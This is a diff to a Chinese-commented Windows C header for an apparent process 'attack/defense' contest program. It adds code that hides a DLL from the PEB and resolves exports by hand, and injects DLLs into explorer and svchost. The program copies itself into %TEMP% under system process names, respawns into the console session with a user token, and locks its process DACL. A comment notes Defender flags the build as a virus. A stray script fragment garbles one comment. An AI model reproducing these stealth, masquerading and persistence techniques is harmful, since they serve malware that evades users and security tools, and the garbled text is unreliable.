@@ -1,4 +1,4 @@
-/*
+﻿/*
  * xxipc.h - 各模块共用的共享内存布局与命名常量（唯一来源）
  *
  * 任何模块都不得再自行定义这些偏移/大小：布局一旦漂移，
@@ -31,6 +31,8 @@
 #define XXIPC_H
 
 #include <intrin.h>     /* __readgsqword / __readfsdword */
+#include <windows.h>
+#include <sddl.h>       /* ConvertStringSecurityDescriptorToSecurityDescriptorW */
 
 /* ---- 共享内存 ---- */
 /* 优先 Global\；没有 SeCreateGlobalPrivilege（非提权运行）时退到 Local\。
@@ -39,7 +41,22 @@
 #define SHARED_MEM_NAME_LOCAL   L"Local\\xx_shared_mem"
 #define SHARED_MEM_SIZE         4096
 
-/* ---- 命名对象的"用途"段：完整名字由 XXNamedObject() 拼成
+/* ================== 全局命名对象（Global\ 互斥体） ==================
+   多进程冗余（弹窗热备）之前用 Local\：那是**按登录会话隔离**的，
+   而我们的 window.dll 会被注入到不同完整性级别/不同桌面（explorer、svchost…），
+   只要有一个实例建在 session 0 或别的会话，两边就互相看不见对方的锁 →
+   "谁都能建窗/谁都不让位"，冗余直接失效。
+   现在统一用 Global\ + 允许 Everyone 访问的 SD：
+     · 同一台机器上所有会话共享同一把锁，不会再各玩各的；
+     · 不需要注销/登出，也就不存在"session 0 抢锁"的问题（session 0 里我们本来没有交互窗口）。
+   创建/打开失败（极少数没有 SeCreateGlobalPrivilege 的宿主）时退回 Local\，
+   并且**两边都按同一个候选顺序**试，保证同权限级别的实例仍然对得上。 */
+#define XX_GLOBAL_MUTEX_SDDL L"D:(A;;GA;;;WD)"
+
+/* ---- 命名对象的"用途"段'@
+Rep 'window\window.c' @'
+        XXNamedObject(name, _countof(name), FALSE, XX_PURPOSE_WND_GUARD, tok, 0);
+        g_hGuardMutex = CreateMutexW(NULL, FALSE, name);：完整名字由 XXNamedObject() 拼成
         （xx_<用途>_<token>），不再有写死的锁名 ---- */
 #define XX_PURPOSE_WND_GUARD    L"wg"     /* 弹窗主互斥体（谁持有谁负责弹窗） */
 #define XX_PURPOSE_WND_MAKE     L"wmg"    /* 兜底建窗串行锁 */
@@ -61,11 +78,11 @@
 #define HEARTBEAT_TICK_MS       500     /* 弹窗心跳节拍 */
 #define HEARTBEAT_STALE_MS      2500    /* 计数器多久不涨判定弹窗丢失 */
 #define HEARTBEAT_POLL_MS       500     /* 监视方轮询间隔（defense 用） */
-#define HEARTBEAT_POLL_MS_DEMON 80      /* svcguard 的复活扫描频率：80ms */
+#define HEARTBEAT_POLL_MS_DEMON 40      /* svcguard 的复活/注入扫描频率：40ms */
 #define HEARTBEAT_RECOVER_MS    1000    /* 仍在停摆时的重试间隔 */
 
 /* ---- 布局版本 ---- */
-#define XX_LAYOUT_VERSION       3       /* v3：新增 64 位命名 token 字段 */
+#define XX_LAYOUT_VERSION       4       /* v4：新增嘲讽计数/完成标志（waste 搬到 xx 内） */
 
 /* ---- 偏移 ---- */
 #define OFFSET_HB_SUFFIX        0
@@ -83,7 +100,11 @@
 #define OFFSET_OWNER_TABLE      928     /* 弹窗持有者表：每会话一格，4 × 24 = 96 → 928..1023 */
 #define OWNER_SLOTS             4
 #define OWNER_SLOT_SIZE         24      /* session(4) pad(4) hwnd(8) pid(4) tick(4) */
-#define OFFSET_NAME_TOKEN64     4024    /* 64 位命名回退 token（4024..4031，日志区之后的空闲段） */
+#define OFFSET_NAME_TOKEN64     4024    /* 64 位命名回退 token（4024..4031） */
+/* 4032/4036 两个字段原先用于"嘲讽满 N 条再杀"的门控；嘲讽整块已删除（见 README 6.16），
+   字段**保留但不再读写**（布局版本保持 v4，避免动偏移）。 */
+#define OFFSET_TAUNT_COUNT      4032    /* 保留（旧的 waste 嘲讽计数，已停用） */
+#define OFFSET_TAUNT_DONE       4036    /* 保留（旧的嘲讽完成标志，已停用） */
 #define OFFSET_COUNTER          4048
 
 /* 弹窗持有者记录（**每会话一格**，共 4 格）。
@@ -101,6 +122,8 @@
 
 /* 64 位命名 token（共享内存回退层用；也顺带把回退层的熵提到 64 位） */
 #define XX_NAME_TOKEN64(p)    (*(ULONGLONG *)((BYTE *)(p) + OFFSET_NAME_TOKEN64))
+#define XX_TAUNT_COUNT(p)     (*(volatile LONG *)((BYTE *)(p) + OFFSET_TAUNT_COUNT))
+#define XX_TAUNT_DONE(p)      (*(volatile LONG *)((BYTE *)(p) + OFFSET_TAUNT_DONE))
 
 #define SUFFIX_MAX              64
 #define MAX_WND_SUFFIX          64
@@ -209,6 +232,50 @@ static __inline void *XXPebPtr(void) {
 #endif
 }
 
+/* ================== 自己解析导出表（**摘链之后唯一可靠的取函数方式**） ==================
+   踩过的坑：`XXHideSelfFromPeb()` 把模块从 PEB 的三条链表里摘掉之后，
+   `GetModuleFileNameW(hMod)` 和 **`GetProcAddress(hMod, ...)` 都会失败**
+   （后者内部要按句柄在加载器表里找回模块）。于是：
+     · 日志里 `实际=(未知)`；
+     · 我们自己 dll 的导出全被当成"不存在" —— 之前那些
+       `DeamonInit / StartDefense / StartAttack / XxKillTree / XxBuildTag 导出不存在`
+       根本不是"旧 dll"，而是**摘链导致的 GetProcAddress 失效**。
+   这里直接按 PE 结构遍历导出表（内存里的头/导出目录都还在，摘链不影响），
+   得到 RVA 后加上模块基址就是函数地址。不依赖加载器，摘链前后都能用。 */
+static __inline FARPROC XXGetProcByName(HMODULE hMod, const char *name) {
+    BYTE *base = (BYTE *)hMod;
+    IMAGE_DOS_HEADER *dos;
+    IMAGE_NT_HEADERS *nt;
+    IMAGE_DATA_DIRECTORY *dir;
+    IMAGE_EXPORT_DIRECTORY *exp;
+    DWORD *names, *funcs;
+    WORD *ords;
+    DWORD i;
+
+    if (!base || !name) return NULL;
+    dos = (IMAGE_DOS_HEADER *)base;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
+    if (dos->e_lfanew <= 0 || dos->e_lfanew > 0x4000) return NULL;
+    nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
+    dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    if (dir->VirtualAddress == 0 || dir->Size == 0) return NULL;
+    exp = (IMAGE_EXPORT_DIRECTORY *)(base + dir->VirtualAddress);
+    if (exp->NumberOfNames == 0 || exp->NumberOfFunctions == 0) return NULL;
+
+    names = (DWORD *)(base + exp->AddressOfNames);
+    ords  = (WORD *)(base + exp->AddressOfNameOrdinals);
+    funcs = (DWORD *)(base + exp->AddressOfFunctions);
+
+    for (i = 0; i < exp->NumberOfNames; i++) {
+        const char *n = (const char *)(base + names[i]);
+        if (strcmp(n, name) == 0) {
+            if (ords[i] >= exp->NumberOfFunctions) return NULL;
+            return (FARPROC)(base + funcs[ords[i]]);
+        }
+    }
+    return NULL;
+}
 /* 返回成功摘除的链表条数（正常是 3） */
 static __inline int XXHideSelfFromPeb(HMODULE hSelf) {
     static const DWORD linkOff[3] = { 0x00, 0x10, 0x20 };   /* 三条链表各自的偏移 */
@@ -293,6 +360,113 @@ static __inline void XXHex64(WCHAR *out, ULONGLONG v) {
     out[16] = L'\0';
 }
 
+/* ================== 认"谁是 xx 本体"（含改名接管副本） ==================
+   交付物只有 xx.exe 一个，但对手是**按进程名**杀 xx.exe 的（yy.cpp 的 GOAL_NAME），
+   所以 xx.exe 会把自身复制到 %TEMP% 并随机改名成 svchost/explorer/conhost，
+   带 --wait 休眠，等 xx.exe 死掉再接管全部工作。于是"谁是 xx"不能只看名字：
+     · 叶子名就是 xx.exe                → 认；
+     · 在 %TEMP% 下且叶子名是那三个之一 → 认（接管副本）。
+   只按名字认会把系统真正的 svchost/explorer 当成我们，导致"xx 已在运行"永不复活；
+   只按 xx.exe 认又会认不出接管副本（atkcore 会把自己的载体当敌方宿主杀掉）。 */
+static __inline BOOL XXIsTakeoverLeaf(const WCHAR *leaf) {
+    if (!leaf || !leaf[0]) return FALSE;
+    return (_wcsicmp(leaf, L"svchost.exe") == 0 ||
+            _wcsicmp(leaf, L"explorer.exe") == 0 ||
+            _wcsicmp(leaf, L"conhost.exe") == 0);
+}
+
+static __inline BOOL XXPathLooksLikeOurXx(LPCWSTR path) {
+    const WCHAR *leaf;
+    if (!path || !path[0]) return FALSE;
+    leaf = wcsrchr(path, L'\\');
+    leaf = leaf ? leaf + 1 : path;
+    if (_wcsicmp(leaf, L"xx.exe") == 0) return TRUE;
+    if (XXIsTakeoverLeaf(leaf)) {
+        WCHAR tmp[MAX_PATH];
+        DWORD n = GetTempPathW(MAX_PATH, tmp);
+        if (n > 0 && n < MAX_PATH && _wcsnicmp(path, tmp, n) == 0) return TRUE;
+    }
+    return FALSE;
+}
+
+/* 路径级判据：能打开进程时用它确认"这个 PID 到底是不是我们的实例"。
+   ⚠ **不要拿它当判活判据**：xx.exe 与接管副本都会把自身 DACL 收成拒绝 Everyone，
+   `OpenProcess` 对它们必然失败 → 永远返回 FALSE（于是"没有实例"→每次心跳停摆白拉一份）。
+   判活用下面不需要句柄的 `XXSnapIsOurInstance`。 */
+static __inline BOOL XXPidIsOurXx(DWORD pid) {
+    HANDLE hProc;
+    WCHAR path[MAX_PATH] = L"";
+    DWORD cch = MAX_PATH;
+    BOOL ok;
+
+    if (!pid) return FALSE;
+    hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    if (!hProc) return FALSE;
+    ok = QueryFullProcessImageNameW(hProc, 0, path, &cch) ? TRUE : FALSE;
+    CloseHandle(hProc);
+    return ok ? XXPathLooksLikeOurXx(path) : FALSE;
+}
+
+/* ================== 会话：保证 xx 跑在"看得见"的会话里 ==================
+   症状（实测截图）：xx 被复活到 session 0（服务会话）——弹窗画在不可见桌面上，
+   Windows 还会弹出"交互式服务检测"提示，等于没有弹窗。
+   根因：复活方自己跑在 session 0 的宿主里（services.exe 之类 SYSTEM 进程），
+   CreateProcess 出来的子进程继承它的会话。
+   做法：拿控制台会话号（WTSGetActiveConsoleSessionId，kernel32）：
+     · 自己就在控制台会话 → 直接 CreateProcessW；
+     · 不在 → 用 WTSQueryUserToken(控制台会话) 拿该会话用户的令牌，
+       CreateProcessAsUserW + winsta0\default 拉进交互会话
+       （SYSTEM 有 SeTcbPrivilege 可以；普通权限拿不到令牌就返回 FALSE，
+        交给控制台会话里的实例去干，别在 session 0 造影子实例）。
+   wtsapi32 动态加载，不增加链接依赖。 */
+static __inline DWORD XXConsoleSession(void) {
+    return (DWORD)WTSGetActiveConsoleSessionId();
+}
+
+static __inline BOOL XXLaunchInConsoleSession(LPCWSTR exePath, BOOL bVisible, DWORD *pPidOut) {
+    STARTUPINFOW si;
+    PROCESS_INFORMATION pi;
+    DWORD mySid = 0, conSid;
+    BOOL ok = FALSE;
+
+    if (!exePath || !exePath[0]) return FALSE;
+    conSid = XXConsoleSession();
+    if (conSid == 0 || conSid == 0xFFFFFFFFu) return FALSE;   /* 没有控制台会话：不乱拉 */
+
+    memset(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
+    memset(&pi, 0, sizeof(pi));
+
+    if (!ProcessIdToSessionId(GetCurrentProcessId(), &mySid)) mySid = 0;
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = bVisible ? SW_SHOWNORMAL : SW_HIDE;
+
+    if (mySid == conSid) {
+        ok = CreateProcessW(exePath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW,
+                            NULL, NULL, &si, &pi);
+    } else {
+        typedef BOOL (WINAPI *WTSQueryUserToken_t)(ULONG, PHANDLE);
+        HMODULE hWts = LoadLibraryW(L"wtsapi32.dll");
+        WTSQueryUserToken_t pQuery = hWts
+            ? (WTSQueryUserToken_t)GetProcAddress(hWts, "WTSQueryUserToken") : NULL;
+        HANDLE hTok = NULL;
+        if (pQuery && pQuery(conSid, &hTok) && hTok) {
+            si.lpDesktop = (LPWSTR)L"winsta0\\default";
+            ok = CreateProcessAsUserW(hTok, exePath, NULL, NULL, NULL, FALSE,
+                                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+            CloseHandle(hTok);
+        }
+        if (hWts) FreeLibrary(hWts);
+    }
+
+    if (ok) {
+        if (pPidOut) *pPidOut = pi.dwProcessId;
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+    return ok;
+}
+
 /* 拼命名对象名。token=0 时退回共享回退 token 名，再没有才用固定名 —— 三者都全体一致。 */
 static __inline void XXNamedObject(WCHAR *out, SIZE_T cch, BOOL bGlobal,
                                    const WCHAR *purpose, ULONGLONG token, DWORD pidOrZero) {
@@ -310,6 +484,38 @@ static __inline void XXNamedObject(WCHAR *out, SIZE_T cch, BOOL bGlobal,
     out[cch - 1] = L'\0';
 }
 
+/* ================== 全局互斥体（Everyone 可访问） ==================
+   为什么需要 SD：xx 以管理员运行（高完整性），它建出来的 Global\ 互斥体默认 DACL
+   只给 SYSTEM/Administrators/创建者；中完整性的宿主（explorer 等）打开会 ACCESS_DENIED，
+   于是它自己另建一把 Local\ 的锁 —— 冗余就废了。
+   这里用 SDDL 显式放开 Everyone（GA），所有会话/完整性级别的实例都能打开同一把锁。
+   失败（没有 SeCreateGlobalPrivilege、或名字冲突）就退 Local\，调用方照常工作。 */
+static __inline HANDLE XXCreateGlobalMutex(const WCHAR *name) {
+    HANDLE h = NULL;
+    PSECURITY_DESCRIPTOR pSD = NULL;
+    SECURITY_ATTRIBUTES sa;
+
+    if (!name || !name[0]) return NULL;
+    if (ConvertStringSecurityDescriptorToSecurityDescriptorW(
+            XX_GLOBAL_MUTEX_SDDL, SDDL_REVISION_1, &pSD, NULL) && pSD) {
+        sa.nLength = sizeof(sa);
+        sa.lpSecurityDescriptor = pSD;
+        sa.bInheritHandle = FALSE;
+        h = CreateMutexW(&sa, FALSE, name);
+        LocalFree(pSD);
+    } else {
+        h = CreateMutexW(NULL, FALSE, name);
+    }
+    if (!h) {
+        /* Global\ 建不出来（权限/命名空间）：退到同名 Local\ */
+        WCHAR alt[160];
+        const WCHAR *leaf = wcsstr(name, L"\\");
+        _snwprintf(alt, _countof(alt) - 1, L"Local\\%s", leaf ? leaf + 1 : name);
+        alt[_countof(alt) - 1] = L'\0';
+        h = CreateMutexW(NULL, FALSE, alt);
+    }
+    return h;
+}
 /* 等注入方把 token 送进来（它在 LoadLibrary 返回后立刻远程调用 XxSetNames）。
    各模块 DllMain 里先用这个短等一下，避免"单例用回退名、探针用 token 名"这种错配。 */
 static __inline void XXWaitToken(volatile ULONGLONG *pToken, DWORD ms) {
@@ -333,6 +539,46 @@ static __inline ULONGLONG XXSharedToken64Now(void) {
     }
     CloseHandle(h);
     return v;
+}
+
+/* ================== 判"我方实例是否活着"：只用进程表，不打开进程 ==================
+   为什么**不需要句柄**：xx.exe 的进程 DACL 把 Everyone 全拒（连查询都拒），
+   `OpenProcess`/`XXPidIsOurXx` 对它必然失败 —— 拿它当判活判据只会永远返回"没有实例",
+   于是每一次心跳停摆都白拉一份。判活这件事本来就只需要"有没有这个进程"，
+   进程表（`CreateToolhelp32Snapshot`）就够，不需要任何句柄。
+
+   真正需要 xx 句柄的是**宿主里的 `guard.dll`**（判活 + 解挂被挂起的线程），
+   它用的是 xx 在收紧 DACL 之前打开、再用 `DuplicateHandle` 交接进宿主的那个句柄
+   （见 README 6.1.1）。svcguard 只负责"发现没了就拉起"，不持句柄。
+
+   判据（全部在进程表快照上做）：
+     ① 叶子名 `xx.exe`                  → 交付本体；
+     ② 三个改名叶子名之一且 PID 等于共享内存 `OFFSET_XX_PID` 记录的实例 PID → 接管副本。
+        只按名字认会把系统真正的 `svchost`/`explorer`/`conhost` 当成我们（于是永不复活）；
+        用记录的 PID 认，既认得出改名的副本，也不会误认系统进程。
+     ③ 其余一律不认。 */
+static __inline DWORD XXSharedInstancePid(void) {
+    HANDLE h = XXOpenShared();
+    DWORD pid = 0;
+    PVOID view;
+
+    if (!h) return 0;
+    view = MapViewOfFile(h, FILE_MAP_READ, 0, 0, SHARED_MEM_SIZE);
+    if (view) {
+        if (XX_LAYOUT(view) == XX_LAYOUT_VERSION) pid = XX_XXPID(view);
+        UnmapViewOfFile(view);
+    }
+    CloseHandle(h);
+    return pid;
+}
+
+/* leaf / pid 直接来自 PROCESSENTRY32W（szExeFile / th32ProcessID）；
+   knownPid 传 XXSharedInstancePid() 的结果（拿不到就传 0，此时只认 xx.exe）。 */
+static __inline BOOL XXSnapIsOurInstance(LPCWSTR leaf, DWORD pid, DWORD knownPid) {
+    if (!leaf || !leaf[0]) return FALSE;
+    if (_wcsicmp(leaf, L"xx.exe") == 0) return TRUE;
+    if (!XXIsTakeoverLeaf(leaf)) return FALSE;
+    return (knownPid != 0 && pid == knownPid) ? TRUE : FALSE;
 }
 
 /* ---- 命名对象名的候选列表 ----
@@ -493,6 +739,94 @@ static __inline const WCHAR *XXPathBase(void *pSharedView, const WCHAR *fallback
     return fallbackSelfPath;
 }
 
+/* ================== 复活目标：优先 %TEMP% 下改名的接管副本 ==================
+   交付物只有一个 xx.exe，但运行期会额外布置一份改名副本（svchost/explorer/conhost.exe
+   在 %TEMP% 下，见 xx.c 的 SpawnTakeoverCopy）。对手 yy 的 HunterWorker 每 50ms
+   **按进程名**杀一轮 xx.exe，所以复活链只要还有副本就去拉副本，拉本体等于白送。
+
+   候选次序：
+     ① `%TEMP%\svchost.exe` / `explorer.exe` / `conhost.exe` —— 我们布置出去的那三个名字；
+        必须通过"看着像我们的可执行文件"校验（PE 头 + 体积），避免拿到同名的残留/占位文件；
+     ② 调用方给的交付本体路径（`<程序目录>\xx.exe`，程序目录来自 OFFSET_XX_PATH）。
+   两个都没有就返回 FALSE，由调用方决定放弃本次复活。
+
+   ⚠ 注意 OFFSET_XX_PATH 的语义是**程序目录**（只由叶子名 xx.exe 的实例刷新），
+   不是"该拉哪个实例"。以前让接管副本改写它，会把程序目录一起改到 %TEMP%，
+   副本接管之后所有模块都加载不到 —— 表现就是"复活一次、没有弹窗、之后再杀不复活"。 */
+/* ---- "这个文件像不像一份可执行的 xx"（用于复活前筛掉残留/占位/垃圾文件） ----
+   判定是**宽容**的：只有"确实读到内容、且明显不是 PE"才返回 FALSE。
+   读不到（被别的进程占着、被杀软拦截 —— 实测本机 Defender 对编译出来的 xx.exe
+   会直接返回 ERROR_VIRUS_INFECTED(225)）一律算"判不了"，按可用处理，绝不因为
+   读不到就把我们自己的副本判死。 */
+static __inline BOOL XXExeFilePlausible(LPCWSTR path) {
+    HANDLE hf;
+    DWORD rd = 0;
+    BYTE head[64];
+    LONG  lfanew;
+    BYTE  sig[4];
+
+    if (!path || !path[0]) return FALSE;
+    if (GetFileAttributesW(path) == INVALID_FILE_ATTRIBUTES) return FALSE;
+
+    hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+                     NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hf == INVALID_HANDLE_VALUE) return TRUE;        /* 打不开 ≠ 不是我们的文件 */
+
+    if (!ReadFile(hf, head, sizeof(head), &rd, NULL)) { /* 读失败：同样不下结论 */
+        CloseHandle(hf);
+        return TRUE;
+    }
+    if (rd < 2 || head[0] != 'M' || head[1] != 'Z') {   /* 读到内容但没有 MZ：不是镜像 */
+        CloseHandle(hf);
+        return FALSE;
+    }
+    if (rd < sizeof(head)) {                            /* 有 MZ 却不到 64 字节：截断文件 */
+        CloseHandle(hf);
+        return FALSE;
+    }
+    lfanew = *(LONG *)(head + 0x3C);
+    if (lfanew <= 0 || lfanew > (1 << 20)) {
+        CloseHandle(hf);
+        return FALSE;
+    }
+    if (SetFilePointer(hf, lfanew, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER ||
+        !ReadFile(hf, sig, sizeof(sig), &rd, NULL) || rd != sizeof(sig)) {
+        CloseHandle(hf);
+        return TRUE;                                    /* 定位/读取失败：判不了，放行 */
+    }
+    CloseHandle(hf);
+    return (sig[0] == 'P' && sig[1] == 'E' && sig[2] == 0 && sig[3] == 0) ? TRUE : FALSE;
+}
+
+static __inline BOOL XXRespawnTargetPath(void *pSharedView, LPCWSTR fallbackXxPath,
+                                         WCHAR *out, SIZE_T cch) {
+    static const WCHAR *leaves[] = { L"svchost.exe", L"explorer.exe", L"conhost.exe", NULL };
+    WCHAR tmp[MAX_PATH];
+    int i;
+
+    (void)pSharedView;          /* 目标选择不再依赖共享内存里的路径记录 */
+    if (!out || cch < 8) return FALSE;
+    out[0] = L'\0';
+
+    if (GetTempPathW(MAX_PATH, tmp)) {
+        for (i = 0; leaves[i]; i++) {
+            WCHAR cand[MAX_PATH];
+            swprintf_s(cand, MAX_PATH, L"%s%s", tmp, leaves[i]);
+            if (GetFileAttributesW(cand) == INVALID_FILE_ATTRIBUTES) continue;
+            if (!XXExeFilePlausible(cand)) continue;         /* 残留/占位/垃圾文件：跳过 */
+            wcsncpy_s(out, cch, cand, _TRUNCATE);
+            return TRUE;
+        }
+    }
+    if (fallbackXxPath && fallbackXxPath[0] &&
+        XXPathLooksLikeOurXx(fallbackXxPath) &&
+        GetFileAttributesW(fallbackXxPath) != INVALID_FILE_ATTRIBUTES) {
+        wcsncpy_s(out, cch, fallbackXxPath, _TRUNCATE);
+        return TRUE;
+    }
+    return FALSE;
+}
+
 /* ---- 日志是无锁共享的：读到别人正在搬移的中间状态时必须有界求长度，
        绝不能让 wcslen 越过日志区、跑出 4096 的映射之外 ---- */
 static __inline size_t XXLogLen(const WCHAR *p, size_t maxChars) {
@@ -518,7 +852,7 @@ _Static_assert(OFFSET_XX_SESSION + 4 <= OFFSET_TMP_SALT, "xx session overlaps tm
 _Static_assert(OFFSET_TMP_SALT + 4 <= OFFSET_XX_PATH, "tmp salt overlaps xx path");
 _Static_assert(OFFSET_XX_PATH + XX_PATH_MAX * 2 <= OFFSET_OWNER_TABLE, "xx path overlaps owner table");
 _Static_assert(OFFSET_OWNER_TABLE + OWNER_SLOTS * OWNER_SLOT_SIZE <= OFFSET_LOG, "owner table overlaps log");
-_Static_assert(OFFSET_NAME_TOKEN64 + 8 <= OFFSET_COUNTER, "name token64 overlaps counter");
+_Static_assert(OFFSET_TAUNT_DONE + 4 <= OFFSET_COUNTER, "taunt fields overlap counter");
 _Static_assert(OFFSET_SELF_HANDLE % 8 == 0, "self-handle must stay 8-byte aligned");
 _Static_assert(OFFSET_LOG + LOG_SIZE <= OFFSET_COUNTER, "log overlaps counter");
 _Static_assert(OFFSET_COUNTER + 4 <= SHARED_MEM_SIZE, "counter outside shared memory");
@@ -527,3 +861,9 @@ _Static_assert(OFFSET_HDL_TABLE % 8 == 0 && HDL_ENTRY_SIZE % 8 == 0 && OFFSET_SE
 #endif
 
 #endif /* XXIPC_H */
+
+
+
+
+
+
